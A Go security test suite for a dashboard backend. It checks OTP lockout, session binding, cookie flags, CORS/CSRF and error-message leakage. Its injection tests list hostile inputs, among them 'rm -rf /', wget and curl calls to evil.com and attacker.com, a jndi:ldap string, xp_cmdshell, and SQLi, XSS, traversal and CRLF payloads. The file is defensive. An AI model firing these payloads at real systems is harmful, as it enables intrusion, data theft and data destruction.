package handlers

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"dashboard/backend/models"
	"dashboard/backend/store"
)

// =============================================================================
// OTP / SESSION SECURITY TESTS (8+ tests)
// =============================================================================

// TestSecurity_OTP_BruteForce verifies that the login endpoint enforces
// rate-limiting / lockout after repeated failed OTP attempts from the same
// UID+IP combination. After 5 incorrect tokens the account must be locked.
func TestSecurity_OTP_BruteForce(t *testing.T) {
	setupTestStores()

	// Seed a valid OTP so the UID is recognized but the attacker uses wrong tokens
	authMu.Lock()
	otpStore["10001"] = otpData{
		Token:     "real-secret-token",
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}
	authMu.Unlock()

	attackerIP := "198.51.100.77:9999"

	// First 4 attempts → 401 Unauthorized
	for i := 0; i < 4; i++ {
		payload := `{"uid":"10001","token":"brute-force-guess"}`
		req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
		req.RemoteAddr = attackerIP
		w := httptest.NewRecorder()
		Login(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Errorf("Attempt %d: expected 401 Unauthorized, got %d", i+1, w.Code)
		}
	}

	// 5th attempt → should trigger lockout (403 Forbidden)
	payload := `{"uid":"10001","token":"brute-force-guess"}`
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = attackerIP
	w := httptest.NewRecorder()
	Login(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("5th attempt: expected 403 Forbidden (lockout), got %d", w.Code)
	}

	// Subsequent attempt after lockout → still 403
	req = httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = attackerIP
	w = httptest.NewRecorder()
	Login(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Post-lockout attempt: expected 403 Forbidden, got %d", w.Code)
	}
}

// TestSecurity_OTP_Replay validates that a used OTP token cannot be reused.
// After a successful login, the OTP must be consumed (deleted from the store)
// so that replaying the same token fails authentication.
func TestSecurity_OTP_Replay(t *testing.T) {
	setupTestStores()

	token := "one-time-use-token-abc"
	authMu.Lock()
	otpStore["10001"] = otpData{
		Token:     token,
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}
	authMu.Unlock()

	clientIP := "192.0.2.50:1234"

	// First login → should succeed
	payload := `{"uid":"10001","token":"` + token + `"}`
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = clientIP
	w := httptest.NewRecorder()
	Login(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("First login: expected 200, got %d", w.Code)
	}

	// Replay attack → same token must be rejected
	req = httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = clientIP
	w = httptest.NewRecorder()
	Login(w, req)

	if w.Code == http.StatusOK {
		t.Error("Replay attack succeeded: used OTP was accepted a second time")
	}
}

// TestSecurity_OTP_Timing verifies that the server returns identical HTTP
// status codes for both valid and invalid UIDs during the request-token flow.
// This prevents account enumeration via timing or response differentiation.
func TestSecurity_OTP_Timing(t *testing.T) {
	setupTestStores()

	// Valid UID
	reqValid := httptest.NewRequest("POST", "/api/auth/request-token",
		bytes.NewBufferString(`{"uid":"10001"}`))
	wValid := httptest.NewRecorder()
	RequestToken(wValid, reqValid)

	// Invalid UID (non-existent)
	reqInvalid := httptest.NewRequest("POST", "/api/auth/request-token",
		bytes.NewBufferString(`{"uid":"99999"}`))
	wInvalid := httptest.NewRecorder()
	RequestToken(wInvalid, reqInvalid)

	// Both must return the same status code (200 OK) to prevent enumeration
	if wValid.Code != wInvalid.Code {
		t.Errorf("Timing attack: different status codes for valid (%d) vs invalid (%d) UIDs",
			wValid.Code, wInvalid.Code)
	}

	// Neither response must contain a "uid" or "token" field
	var validResp map[string]interface{}
	json.Unmarshal(wValid.Body.Bytes(), &validResp)
	if _, has := validResp["token"]; has {
		t.Error("Valid UID response leaks 'token' field — enables enumeration")
	}

	var invalidResp map[string]interface{}
	json.Unmarshal(wInvalid.Body.Bytes(), &invalidResp)
	if _, has := invalidResp["uid"]; has {
		t.Error("Invalid UID response contains 'uid' field — enables enumeration")
	}
}

// TestSecurity_Session_Hijack verifies that a session bound to one IP address
// is rejected when presented from a different IP address, preventing session
// hijacking via stolen cookies.
func TestSecurity_Session_Hijack(t *testing.T) {
	setupTestStores()

	sessionToken := "hijack-test-session-token"
	authMu.Lock()
	sessionStore[sessionToken] = sessionData{
		UID:       "10001",
		Username:  "admin",
		IPAddress: "192.0.2.10",
		ExpiresAt: time.Now().Add(8 * time.Hour),
	}
	authMu.Unlock()

	// Wrap a dummy handler with AuthMiddleware
	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	// Request from a DIFFERENT IP using the stolen session cookie
	req := httptest.NewRequest("GET", "/api/summary", nil)
	req.AddCookie(&http.Cookie{Name: "session_token", Value: sessionToken})
	req.RemoteAddr = "203.0.113.66:5555" // Attacker's IP
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("Session hijack not detected: expected 401, got %d", w.Code)
	}
}

// TestSecurity_Session_Fixation verifies that logging in with a fabricated/
// attacker-controlled session token does NOT authenticate the user. The server
// must generate its own session tokens upon successful login, not accept
// client-provided ones.
func TestSecurity_Session_Fixation(t *testing.T) {
	setupTestStores()

	// Attacker pre-sets a session token in the store
	fixedToken := "attacker-controlled-session-token"
	// Intentionally NOT placed in sessionStore

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("protected-data"))
	})
	wrapped := AuthMiddleware(dummy)

	req := httptest.NewRequest("GET", "/api/summary", nil)
	req.AddCookie(&http.Cookie{Name: "session_token", Value: fixedToken})
	req.RemoteAddr = "192.0.2.10:1234"
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	if w.Code == http.StatusOK {
		t.Error("Session fixation: fabricated session token was accepted as valid")
	}
}

// TestSecurity_Session_Expiry ensures that an expired session is rejected.
// Sessions that have passed their ExpiresAt time must not grant access.
func TestSecurity_Session_Expiry(t *testing.T) {
	setupTestStores()

	expiredToken := "expired-session-for-security-test"
	authMu.Lock()
	sessionStore[expiredToken] = sessionData{
		UID:       "10001",
		Username:  "admin",
		IPAddress: "192.0.2.10",
		ExpiresAt: time.Now().Add(-1 * time.Hour), // Expired 1 hour ago
	}
	authMu.Unlock()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	req := httptest.NewRequest("GET", "/api/summary", nil)
	req.AddCookie(&http.Cookie{Name: "session_token", Value: expiredToken})
	req.RemoteAddr = "192.0.2.10:1234"
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("Expired session granted access: expected 401, got %d", w.Code)
	}
}

// TestSecurity_Cookie_HttpOnly ensures the session cookie set during login
// has the HttpOnly flag enabled, preventing JavaScript access (XSS mitigation).
func TestSecurity_Cookie_HttpOnly(t *testing.T) {
	setupTestStores()

	authMu.Lock()
	otpStore["10001"] = otpData{
		Token:     "httponly-test-token",
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}
	authMu.Unlock()

	payload := `{"uid":"10001","token":"httponly-test-token"}`
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = "192.0.2.10:1234"
	w := httptest.NewRecorder()
	Login(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("Login failed: expected 200, got %d", w.Code)
	}

	cookies := w.Result().Cookies()
	found := false
	for _, c := range cookies {
		if c.Name == "session_token" {
			found = true
			if !c.HttpOnly {
				t.Error("Session cookie is missing HttpOnly flag — vulnerable to XSS cookie theft")
			}
		}
	}
	if !found {
		t.Error("No session_token cookie was set during login")
	}
}

// TestSecurity_Cookie_Secure ensures the session cookie has the Secure flag
// set, preventing transmission over unencrypted HTTP connections.
func TestSecurity_Cookie_Secure(t *testing.T) {
	setupTestStores()

	authMu.Lock()
	otpStore["10001"] = otpData{
		Token:     "secure-flag-test-token",
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}
	authMu.Unlock()

	payload := `{"uid":"10001","token":"secure-flag-test-token"}`
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = "192.0.2.10:1234"
	w := httptest.NewRecorder()
	Login(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("Login failed: expected 200, got %d", w.Code)
	}

	cookies := w.Result().Cookies()
	for _, c := range cookies {
		if c.Name == "session_token" {
			if !c.Secure {
				t.Error("Session cookie is missing Secure flag — transmittable over plain HTTP")
			}
			return
		}
	}
	t.Error("No session_token cookie was set during login")
}

// =============================================================================
// CORS & CSRF TESTS (5+ tests)
// =============================================================================

// TestSecurity_CORS_AllowedOrigin verifies that the CORS middleware sets the
// correct Access-Control-Allow-Origin header for the approved frontend origin.
func TestSecurity_CORS_AllowedOrigin(t *testing.T) {
	setupTestStores()

	// RequestToken explicitly sets CORS headers for localhost:5173
	req := httptest.NewRequest("OPTIONS", "/api/auth/request-token", nil)
	req.Header.Set("Origin", "http://localhost:5173")
	w := httptest.NewRecorder()
	RequestToken(w, req)

	origin := w.Header().Get("Access-Control-Allow-Origin")
	if origin != "http://localhost:5173" {
		t.Errorf("Expected CORS origin http://localhost:5173, got %s", origin)
	}
}

// TestSecurity_CORS_BlockedOrigin verifies that requests from unauthorized
// origins are blocked by the CSRF validation in AuthMiddleware.
func TestSecurity_CORS_BlockedOrigin(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	req := httptest.NewRequest("POST", "/api/actions", nil)
	req.Header.Set("Origin", "http://evil-attacker.com")
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Malicious origin was not blocked: expected 403, got %d", w.Code)
	}
}

// TestSecurity_CORS_WildcardBlocked ensures the server never returns
// Access-Control-Allow-Origin: * which would allow any origin to make
// credentialed requests.
func TestSecurity_CORS_WildcardBlocked(t *testing.T) {
	setupTestStores()

	req := httptest.NewRequest("OPTIONS", "/api/auth/login", nil)
	req.Header.Set("Origin", "*")
	w := httptest.NewRecorder()
	Login(w, req)

	origin := w.Header().Get("Access-Control-Allow-Origin")
	if origin == "*" {
		t.Error("CORS wildcard (*) is allowed — all origins can make credentialed requests")
	}
}

// TestSecurity_CORS_CredentialsHeader verifies that the
// Access-Control-Allow-Credentials header is set to "true", required for
// HttpOnly cookie-based authentication to work cross-origin.
func TestSecurity_CORS_CredentialsHeader(t *testing.T) {
	setupTestStores()

	req := httptest.NewRequest("OPTIONS", "/api/auth/login", nil)
	w := httptest.NewRecorder()
	Login(w, req)

	creds := w.Header().Get("Access-Control-Allow-Credentials")
	if creds != "true" {
		t.Errorf("Expected Access-Control-Allow-Credentials=true, got %s", creds)
	}
}

// TestSecurity_CSRF_TokenValidation verifies that modifying requests (POST)
// without a valid Origin or Referer header are blocked as potential CSRF attacks.
func TestSecurity_CSRF_TokenValidation(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	tests := []struct {
		name     string
		origin   string
		referer  string
		wantCode int
	}{
		{
			name:     "No Origin or Referer",
			origin:   "",
			referer:  "",
			wantCode: http.StatusForbidden,
		},
		{
			name:     "Malicious Origin",
			origin:   "http://phishing-site.com",
			referer:  "",
			wantCode: http.StatusForbidden,
		},
		{
			name:     "Spoofed Referer subdomain",
			origin:   "",
			referer:  "http://localhost:5173.evil.test/poc",
			wantCode: http.StatusForbidden,
		},
		{
			name:     "Valid Origin passes CSRF",
			origin:   "http://localhost:5173",
			referer:  "",
			wantCode: http.StatusUnauthorized, // Passes CSRF but no session → 401
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "/api/actions", nil)
			if tc.origin != "" {
				req.Header.Set("Origin", tc.origin)
			}
			if tc.referer != "" {
				req.Header.Set("Referer", tc.referer)
			}
			w := httptest.NewRecorder()
			wrapped.ServeHTTP(w, req)

			if w.Code != tc.wantCode {
				t.Errorf("%s: expected %d, got %d", tc.name, tc.wantCode, w.Code)
			}
		})
	}
}

// =============================================================================
// API SECURITY TESTS (10+ tests)
// =============================================================================

// TestSecurity_AuthBypass_NoSession ensures that unauthenticated requests to
// protected API endpoints are rejected with 401 Unauthorized.
func TestSecurity_AuthBypass_NoSession(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("sensitive-data"))
	})
	wrapped := AuthMiddleware(dummy)

	// Protected endpoints that must require auth
	endpoints := []string{"/api/summary", "/api/agents", "/api/alerts", "/api/logs", "/api/fim"}

	for _, ep := range endpoints {
		req := httptest.NewRequest("GET", ep, nil)
		req.RemoteAddr = "192.0.2.10:1234"
		w := httptest.NewRecorder()
		wrapped.ServeHTTP(w, req)

		if w.Code == http.StatusOK {
			t.Errorf("Auth bypass on %s: no session cookie but got 200 OK", ep)
		}
	}
}

// TestSecurity_AuthBypass_InvalidCookie ensures that a request with a
// fabricated/invalid session cookie is rejected.
func TestSecurity_AuthBypass_InvalidCookie(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	req := httptest.NewRequest("GET", "/api/summary", nil)
	req.AddCookie(&http.Cookie{Name: "session_token", Value: "completely-fake-token-xyz"})
	req.RemoteAddr = "192.0.2.10:1234"
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("Invalid cookie accepted: expected 401, got %d", w.Code)
	}
}

// TestSecurity_IDOR_AlertAccess tests that alert detail endpoint does not
// expose other users' alert data when an alert ID belonging to a different
// context is requested. The handler should return a proper response without
// leaking internal details.
func TestSecurity_IDOR_AlertAccess(t *testing.T) {
	setupTestStores()

	// Try to access a non-existent alert - should return 404 with generic error
	req := httptest.NewRequest("GET", "/api/alerts/al-private-user2-alert", nil)
	w := httptest.NewRecorder()
	GetAlertDetail(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected 404 for non-existent alert, got %d", w.Code)
	}

	// Verify the error message doesn't leak internal details
	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	errMsg := resp["error"]
	if strings.Contains(errMsg, "database") || strings.Contains(errMsg, "sql") || strings.Contains(errMsg, "table") {
		t.Errorf("IDOR: error message leaks database internals: %s", errMsg)
	}
}

// TestSecurity_InternalAPI_NoToken ensures the internal SOAR decision API
// rejects requests that do not provide the X-Aegis-Internal-Key header.
func TestSecurity_InternalAPI_NoToken(t *testing.T) {
	setupTestStores()

	// Set an internal token in the environment
	t.Setenv("AEGIS_INTERNAL_TOKEN", "super-secret-internal-key")

	payload := `{"schema_version":"littleboy.soc.layer2.orchestrator_decision.v7"}`
	req := httptest.NewRequest("POST", "/api/internal/soar/decision", bytes.NewBufferString(payload))
	w := httptest.NewRecorder()
	HandleInternalSoarDecision(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("Internal API without token: expected 401, got %d", w.Code)
	}
}

// TestSecurity_InternalAPI_WrongToken ensures the internal SOAR decision API
// rejects requests with an incorrect internal key.
func TestSecurity_InternalAPI_WrongToken(t *testing.T) {
	setupTestStores()

	t.Setenv("AEGIS_INTERNAL_TOKEN", "super-secret-internal-key")

	payload := `{"schema_version":"littleboy.soc.layer2.orchestrator_decision.v7"}`
	req := httptest.NewRequest("POST", "/api/internal/soar/decision", bytes.NewBufferString(payload))
	req.Header.Set("X-Aegis-Internal-Key", "wrong-key-from-attacker")
	w := httptest.NewRecorder()
	HandleInternalSoarDecision(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("Internal API with wrong token: expected 401, got %d", w.Code)
	}
}

// TestSecurity_InternalAPI_ValidToken ensures the internal SOAR decision API
// accepts requests with the correct internal key and a valid payload.
func TestSecurity_InternalAPI_ValidToken(t *testing.T) {
	setupTestStores()

	t.Setenv("AEGIS_INTERNAL_TOKEN", "correct-internal-key-12345")

	validPayload := `{
		"schema_version": "littleboy.soc.layer2.orchestrator_decision.v7",
		"timestamp": "2026-07-07T10:00:00Z",
		"input_summary": {"incident_id": "INC-SEC-001"},
		"verified_case": {
			"threat_confirmed": true,
			"title": "SQL Injection Attack",
			"summary": "Detected SQL injection attempt",
			"entities": {"users": ["admin"], "accounts_masked": [], "hosts": [], "ips": ["198.51.100.10"]}
		},
		"scoring": {"final_risk_score_0_10": 9.5, "priority": "critical"},
		"decision": {"final_decision": "block", "justification": "High-confidence SQL injection"},
		"actions": []
	}`
	req := httptest.NewRequest("POST", "/api/internal/soar/decision", bytes.NewBufferString(validPayload))
	req.Header.Set("X-Aegis-Internal-Key", "correct-internal-key-12345")
	w := httptest.NewRecorder()
	HandleInternalSoarDecision(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Internal API with valid token: expected 200, got %d", w.Code)
	}
}

// TestSecurity_RateLimiting_Auth validates the rate limiting mechanism on the
// request-token endpoint. An IP that is locked out must receive 429.
func TestSecurity_RateLimiting_Auth(t *testing.T) {
	setupTestStores()

	// Pre-set a lockout for the attacker's IP
	attackerIP := "198.51.100.99"
	authMu.Lock()
	lockoutStore[attackerIP] = lockoutData{
		BlockedUntil: time.Now().Add(10 * time.Minute),
	}
	authMu.Unlock()

	payload := `{"uid":"10001"}`
	req := httptest.NewRequest("POST", "/api/auth/request-token", bytes.NewBufferString(payload))
	req.RemoteAddr = attackerIP + ":1234"
	w := httptest.NewRecorder()
	RequestToken(w, req)

	if w.Code != http.StatusTooManyRequests {
		t.Errorf("Rate limiting not enforced: expected 429, got %d", w.Code)
	}
}

// TestSecurity_InputValidation_AlertId tests that alert ID parameters
// containing path traversal or injection characters are handled safely.
func TestSecurity_InputValidation_AlertId(t *testing.T) {
	setupTestStores()

	maliciousIDs := []string{
		"../../../etc/passwd",
		"al-001; DROP TABLE alerts;",
		"al-001' OR '1'='1",
		"<script>alert(1)</script>",
		"al-001%00",
	}

	for _, id := range maliciousIDs {
		req := httptest.NewRequest("GET", "/api/alerts/"+url.PathEscape(id), nil)
		w := httptest.NewRecorder()
		GetAlertDetail(w, req)

		// Should get a clean 404, not 500 or a data leak
		if w.Code == http.StatusInternalServerError {
			t.Errorf("Alert ID '%s' caused internal server error", id)
		}

		body := w.Body.String()
		if strings.Contains(body, "panic") || strings.Contains(body, "stack") || strings.Contains(body, "runtime") {
			t.Errorf("Alert ID '%s' caused server to leak stack trace", id)
		}
	}
}

// TestSecurity_InputValidation_AgentId tests that agent ID parameters
// containing injection patterns are handled safely without crashing.
func TestSecurity_InputValidation_AgentId(t *testing.T) {
	setupTestStores()

	maliciousIDs := []string{
		"agent-01; cat /etc/shadow",
		"agent-01$(whoami)",
		"agent-01`id`",
		"../../../../etc/passwd",
		"agent-01\r\nX-Injected: true",
	}

	for _, id := range maliciousIDs {
		req := httptest.NewRequest("GET", "/api/agents/"+url.PathEscape(id), nil)
		w := httptest.NewRecorder()
		GetAgentDetail(w, req)

		// Must not be 500 or leak internals
		if w.Code == http.StatusInternalServerError {
			t.Errorf("Agent ID '%s' caused internal server error", id)
		}
	}
}

// TestSecurity_Simulation_Auth verifies that the simulation endpoint is
// protected behind authentication middleware.
func TestSecurity_Simulation_Auth(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		TriggerSimulation(w, r)
	})
	wrapped := AuthMiddleware(dummy)

	payload := `{"agentId":"agent-01","type":"ransomware"}`
	req := httptest.NewRequest("POST", "/api/simulate", bytes.NewBufferString(payload))
	// No session cookie — unauthenticated
	req.RemoteAddr = "192.0.2.10:1234"
	req.Header.Set("Origin", "http://localhost:5173")
	w := httptest.NewRecorder()
	wrapped.ServeHTTP(w, req)

	if w.Code == http.StatusOK {
		t.Error("Simulation endpoint accessible without authentication")
	}
}

// =============================================================================
// INJECTION TESTS (6+ tests)
// =============================================================================

// TestSecurity_SQLi_AlertSearch verifies that SQL injection payloads in search
// queries are safely handled. The in-memory store is not SQL-based, but the
// input must still be sanitized and not cause crashes.
func TestSecurity_SQLi_AlertSearch(t *testing.T) {
	setupTestStores()

	sqliPayloads := []string{
		"' OR '1'='1",
		"'; DROP TABLE alerts; --",
		"1 UNION SELECT * FROM operators --",
		"' AND 1=CONVERT(int, @@version)--",
		"1; EXEC xp_cmdshell('whoami')--",
	}

	for _, payload := range sqliPayloads {
		req := httptest.NewRequest("GET", "/api/alerts?q="+url.QueryEscape(payload), nil)
		w := httptest.NewRecorder()
		GetAlerts(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("SQLi payload '%s' caused non-200 response: %d", payload, w.Code)
		}

		body := w.Body.String()
		if strings.Contains(body, "syntax error") || strings.Contains(body, "SQL") {
			t.Errorf("SQLi payload '%s' leaked SQL error details", payload)
		}
	}
}

// TestSecurity_XSS_AlertTitle verifies that XSS payloads stored in alert
// fields are properly encoded in JSON responses and not reflected as raw HTML.
func TestSecurity_XSS_AlertTitle(t *testing.T) {
	// Seed an alert with XSS payload in the title
	store.DB.Mu.Lock()
	store.DB.Alerts = append(store.DB.Alerts, &models.Alert{
		ID:       "al-xss-test",
		Title:    "<script>alert('XSS')</script>",
		Status:   "open",
		Severity: "high",
	})
	store.DB.Mu.Unlock()

	req := httptest.NewRequest("GET", "/api/alerts/al-xss-test", nil)
	w := httptest.NewRecorder()
	GetAlertDetail(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("Expected 200, got %d", w.Code)
	}

	contentType := w.Header().Get("Content-Type")
	if !strings.Contains(contentType, "application/json") {
		t.Error("Response Content-Type is not application/json — XSS risk via HTML rendering")
	}

	// JSON encoding escapes < > characters, ensuring the payload isn't executable
	body := w.Body.String()
	if strings.Contains(body, "<script>") {
		t.Error("XSS payload in alert title was not escaped in JSON response")
	}
}

// TestSecurity_CommandInjection_AgentId tests that command injection payloads
// in the agent ID parameter do not cause command execution.
func TestSecurity_CommandInjection_AgentId(t *testing.T) {
	setupTestStores()

	injectionPayloads := []string{
		"agent-01; rm -rf /",
		"agent-01 | cat /etc/passwd",
		"agent-01 && wget http://evil.com/shell.sh",
		"$(curl http://attacker.com/exfil)",
		"`whoami`",
	}

	for _, payload := range injectionPayloads {
		req := httptest.NewRequest("GET", "/api/agents/"+url.PathEscape(payload), nil)
		w := httptest.NewRecorder()
		GetAgentDetail(w, req)

		// The handler should return 404 (not found), not execute any commands
		if w.Code == http.StatusInternalServerError {
			t.Errorf("Command injection payload '%s' caused 500 error", payload)
		}
	}
}

// TestSecurity_PathTraversal_AlertId tests path traversal payloads in the
// alert ID to ensure they cannot access files outside the application scope.
func TestSecurity_PathTraversal_AlertId(t *testing.T) {
	setupTestStores()

	traversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
		"..%252f..%252f..%252fetc/passwd",
	}

	for _, payload := range traversalPayloads {
		req := httptest.NewRequest("GET", "/api/alerts/"+url.PathEscape(payload), nil)
		w := httptest.NewRecorder()
		GetAlertDetail(w, req)

		body := w.Body.String()
		if strings.Contains(body, "root:") || strings.Contains(body, "SAM") {
			t.Errorf("Path traversal succeeded with payload '%s': file contents leaked", payload)
		}
	}
}

// TestSecurity_JsonInjection_SoarDecision verifies that malicious JSON
// payloads sent to the SOAR decision endpoint do not cause injection or
// unexpected behavior.
func TestSecurity_JsonInjection_SoarDecision(t *testing.T) {
	setupTestStores()

	t.Setenv("AEGIS_INTERNAL_TOKEN", "test-internal-key")

	// Payload with nested injection attempts in string fields
	maliciousPayload := `{
		"schema_version": "littleboy.soc.layer2.orchestrator_decision.v7",
		"timestamp": "2026-07-07T10:00:00Z",
		"input_summary": {"incident_id": "INC\"; DROP TABLE alerts;--"},
		"verified_case": {
			"threat_confirmed": true,
			"title": "Attack\"><script>alert(1)</script>",
			"summary": "Test ${jndi:ldap://evil.com/a}",
			"entities": {"users": ["admin' OR '1'='1"], "accounts_masked": [], "hosts": [], "ips": ["127.0.0.1"]}
		},
		"scoring": {"final_risk_score_0_10": 9.0, "priority": "critical"},
		"decision": {"final_decision": "block", "justification": "Test injection"},
		"actions": []
	}`

	req := httptest.NewRequest("POST", "/api/internal/soar/decision", bytes.NewBufferString(maliciousPayload))
	req.Header.Set("X-Aegis-Internal-Key", "test-internal-key")
	w := httptest.NewRecorder()
	HandleInternalSoarDecision(w, req)

	// Should process without crashing (200 OK) — the data is stored safely
	if w.Code == http.StatusInternalServerError {
		t.Error("JSON injection payload caused internal server error")
	}
}

// TestSecurity_HeaderInjection tests CRLF injection in various input fields
// to ensure HTTP header injection/response splitting is not possible.
func TestSecurity_HeaderInjection(t *testing.T) {
	setupTestStores()

	// Attempt CRLF injection via alert search query
	crlfPayloads := []string{
		"test\r\nX-Injected: true",
		"test\r\n\r\n<html>injected</html>",
		"test%0d%0aSet-Cookie:%20evil=true",
	}

	for _, payload := range crlfPayloads {
		req := httptest.NewRequest("GET", "/api/alerts?q="+url.QueryEscape(payload), nil)
		w := httptest.NewRecorder()
		GetAlerts(w, req)

		// Check that no injected headers appear in the response
		if w.Header().Get("X-Injected") != "" {
			t.Errorf("CRLF injection succeeded: X-Injected header present")
		}

		// Response should still be valid JSON
		if w.Code != http.StatusOK {
			t.Errorf("CRLF payload '%s' caused non-200 response: %d", payload, w.Code)
		}
	}
}

// =============================================================================
// ERROR HANDLING TESTS (4+ tests)
// =============================================================================

// TestSecurity_ErrorNoStackTrace ensures error responses do not contain Go
// stack traces, file paths, or goroutine information.
func TestSecurity_ErrorNoStackTrace(t *testing.T) {
	setupTestStores()

	// Request a non-existent alert
	req := httptest.NewRequest("GET", "/api/alerts/nonexistent-alert-id", nil)
	w := httptest.NewRecorder()
	GetAlertDetail(w, req)

	body := w.Body.String()
	dangerousPatterns := []string{
		"goroutine",
		".go:",
		"runtime/",
		"panic(",
		"stack trace",
		"/home/",
		"/usr/",
		"d:\\hackathon",
	}

	for _, pattern := range dangerousPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			t.Errorf("Error response contains dangerous pattern '%s': %s", pattern, body)
		}
	}
}

// TestSecurity_ErrorNoDbLeak ensures error responses do not leak database
// schema details, table names, or SQL error messages.
func TestSecurity_ErrorNoDbLeak(t *testing.T) {
	setupTestStores()

	// Non-existent agent
	req := httptest.NewRequest("GET", "/api/agents/agent-nonexistent", nil)
	w := httptest.NewRecorder()
	GetAgentDetail(w, req)

	body := strings.ToLower(w.Body.String())
	dbLeakPatterns := []string{
		"select ", "insert ", "update ", "delete ", "from ", "table",
		"postgresql", "sqlite", "mysql", "connection string",
		"column", "constraint", "foreign key",
	}

	for _, pattern := range dbLeakPatterns {
		if strings.Contains(body, pattern) {
			t.Errorf("Error response leaks database info with pattern '%s'", pattern)
		}
	}
}

// TestSecurity_ErrorGenericMessage ensures that authentication error messages
// are generic and do not reveal whether the UID or the token was incorrect.
func TestSecurity_ErrorGenericMessage(t *testing.T) {
	setupTestStores()

	authMu.Lock()
	otpStore["10001"] = otpData{
		Token:     "correct-token",
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}
	authMu.Unlock()

	// Send wrong token
	payload := `{"uid":"10001","token":"wrong-token"}`
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewBufferString(payload))
	req.RemoteAddr = "192.0.2.10:1234"
	w := httptest.NewRecorder()
	Login(w, req)

	body := strings.ToLower(w.Body.String())

	// Error message must NOT reveal which field was wrong
	if strings.Contains(body, "token is wrong") || strings.Contains(body, "uid not found") ||
		strings.Contains(body, "user does not exist") || strings.Contains(body, "password incorrect") {
		t.Errorf("Login error message is too specific: %s", w.Body.String())
	}
}

// TestSecurity_NotFound_NoInfoLeak ensures 404 responses do not reveal
// internal routing information, server technology, or file system paths.
func TestSecurity_NotFound_NoInfoLeak(t *testing.T) {
	setupTestStores()

	// Non-existent alert
	req := httptest.NewRequest("GET", "/api/alerts/totally-fake-id-12345", nil)
	w := httptest.NewRecorder()
	GetAlertDetail(w, req)

	body := strings.ToLower(w.Body.String())
	infoLeakPatterns := []string{
		"server:", "powered by", "x-powered-by",
		"apache", "nginx", "express",
		"/var/", "/opt/", "c:\\",
	}

	for _, pattern := range infoLeakPatterns {
		if strings.Contains(body, pattern) {
			t.Errorf("404 response leaks server info with pattern '%s'", pattern)
		}
	}
}

// =============================================================================
// SECURITY HEADERS TESTS (5+ tests)
// =============================================================================

// TestSecurity_Headers_XContentTypeOptions verifies the X-Content-Type-Options
// header is set to "nosniff" to prevent MIME-type sniffing attacks.
func TestSecurity_Headers_XContentTypeOptions(t *testing.T) {
	setupTestStores()

	dummy := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	wrapped := AuthMiddleware(dummy)

	// Even on auth check endpoint (bypasses session check), headers should be set
	req := httptest.NewRequest("GET", "/api/auth/check", nil)
	w := httptest.NewRecorder()
